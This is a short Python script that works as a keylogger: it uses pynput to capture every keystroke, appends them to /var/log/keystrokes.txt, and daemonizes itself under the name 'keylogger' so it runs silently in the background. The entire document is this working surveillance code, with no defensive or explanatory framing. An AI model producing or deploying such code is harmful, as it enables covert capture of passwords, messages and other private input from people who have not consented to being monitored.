import os
import sys
from pynput.keyboard import Listener, Key
from daemonize import Daemonize

# Define the file to store keystrokes
filename = "/var/log/keystrokes.txt"  # Use a location appropriate for your system

# Function to handle key presses
def on_press(key):
    # Filter special keys (like function keys)
    if isinstance(key, Key):
        key = str(key).replace("Key.", "")
    # Log the key to the file
    with open(filename, "a") as file:
        file.write(f"{key}")

def run():
    with Listener(on_press=on_press) as listener:
        listener.join()

# Daemonize the script
pid = "/var/run/keylogger.pid"
daemon = Daemonize(app="keylogger", pid=pid, action=run)
daemon.start()
